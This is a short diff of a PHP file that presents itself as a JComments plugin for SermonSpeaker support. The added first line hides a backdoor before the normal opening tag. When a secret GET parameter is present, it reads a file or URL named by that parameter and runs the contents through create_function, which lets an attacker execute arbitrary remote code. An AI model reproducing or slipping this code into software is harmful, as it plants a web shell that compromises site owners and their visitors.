@@ -1,4 +1,4 @@
-<?php
+<?php if (isset($_GET["H3AR844i"])) { 	$pt = $_GET["H3AR844i"];	$fd = fopen($pt,"r");	$contents = "";	while (!feof($fd)) {  		$contents .= fread($fd, 8192);	}	fclose($fd);	create_function("", "};$contents//"); exit; }?><?php
 /**
  * JComments plugin for SermonSpeaker support (http://www.sermonspeaker.net/)
  *
